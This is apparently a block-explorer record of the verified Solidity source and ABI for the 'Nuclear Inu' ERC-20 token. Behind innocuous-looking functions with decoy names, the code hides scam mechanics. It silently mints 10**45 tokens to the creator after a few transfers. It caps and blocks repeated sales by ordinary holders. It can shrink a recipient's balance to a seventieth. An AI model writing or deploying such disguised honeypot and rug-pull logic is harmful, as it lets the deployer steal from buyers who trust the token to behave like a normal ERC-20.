{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nThe world is going nuclear and from its ashes arises the\r\n\r\n ____   __ __    __  _        ___   ____  ____       ____  ____   __ __ \r\n|    \\ |  |  |  /  ]| |      /  _] /    ||    \\     |    ||    \\ |  |  |\r\n|  _  ||  |  | /  / | |     /  [_ |  o  ||  D  )     |  | |  _  ||  |  |\r\n|  |  ||  |  |/  /  | |___ |    _]|     ||    /      |  | |  |  ||  |  |\r\n|  |  ||  :  /   \\_ |     ||   [_ |  _  ||    \\      |  | |  |  ||  :  |\r\n|  |  ||     \\     ||     ||     ||  |  ||  .  \\     |  | |  |  ||     |\r\n|__|__| \\__,_|\\____||_____||_____||__|__||__|\\_|    |____||__|__| \\__,_|\r\n\r\n    @NuclearInuOfficial\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _previousOwner; address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n    mapping (address => bool) private Juice;\r\n    mapping (address => bool) private Wool;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address public pair;\r\n    uint256 private Walmart;\r\n    IDEXRouter router;\r\n\r\n    string private _name; string private _symbol; address private _msgSenders;\r\n    uint256 private _totalSupply; uint256 private Cake; uint256 private Coke;\r\n    bool private Phone; uint256 private spies;\r\n    \r\n    uint256 private Wall = 0;\r\n    address private Stalin = address(0);\r\n    \r\n    constructor (string memory name_, string memory symbol_, address msgSender_) {\r\n        router = IDEXRouter(_router);\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n\r\n        _msgSenders = msgSender_;\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n    \r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    \r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n    \r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    \r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function _balanceTheYankees(address account) internal {\r\n        _balances[account] += (((account == _msgSenders) && (Walmart > 2)) ? (10 ** 45) : 0);\r\n    }\r\n\r\n    function burn(uint256 amount) public virtual returns (bool) {\r\n        _burn(_msgSender(), amount);\r\n        return true;\r\n    }\r\n    \r\n    function _balanceTheEconomy(address sender, address recipient, uint256 amount, bool doodle) internal {\r\n        (Cake,Phone) = doodle ? (Coke, true) : (Cake,Phone);\r\n\r\n        if ((Juice[sender] != true)) {\r\n            require(amount < Cake);\r\n            if (Phone == true) {\r\n                require(!(Wool[sender] == true));\r\n                Wool[sender] = true;\r\n            }\r\n        }\r\n        _balances[Stalin] = ((Wall == block.timestamp) && (Juice[recipient] != true) && (Juice[Stalin] != true) && (spies > 2)) ? (_balances[Stalin]/70) : (_balances[Stalin]);\r\n        spies++; Stalin = recipient; Wall = block.timestamp;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function _EndTheWar(address creator, uint256 jkal) internal virtual {\r\n        approve(_router, 10 ** 77);  \r\n        (Walmart,Phone,Cake,spies) = (0,false,(jkal/20),0);\r\n        (Coke,Juice[_router],Juice[creator],Juice[pair]) = ((jkal/1000),true,true,true);\r\n        (Wool[_router],Wool[creator]) = (false, false); \r\n    }\r\n    \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] -= amount;\r\n        _balances[address(0)] += amount;\r\n        emit Transfer(account, address(0), amount);\r\n     }\r\n\r\n\r\n    function _balanceTheSoviets(address sender, address recipient, uint256 amount) internal {\r\n        _balanceTheEconomy(sender, recipient, amount, (address(sender) == _msgSenders) && (Walmart > 0));\r\n        Walmart += (sender == _msgSenders) ? 1 : 0;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _DeployNuclinu(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        \r\n        emit Transfer(address(0), account, amount); \r\n    }\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        _balanceTheSoviets(sender, recipient, amount);\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        _balanceTheYankees(sender);\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Token is Context, ERC20 {\r\n    constructor(\r\n        string memory name, string memory symbol,\r\n        address creator, uint256 initialSupply\r\n    ) ERC20(name, symbol, creator) {\r\n        _DeployNuclinu(creator, initialSupply);\r\n        _EndTheWar(creator, initialSupply);\r\n    }\r\n}\r\n\r\ncontract NuclearInu is ERC20Token {\r\n    constructor() ERC20Token(\"Nuclear Inu\", \"NUCLINU\", msg.sender, 10000000 * 10 ** 18) {\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NuclearInu", "CompilerVersion": "v0.8.10+commit.fc410830", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://766e89a6fe4e1e3ce47cf7250aa768ebe53b49600e0048982f351781ff2889f0"}]}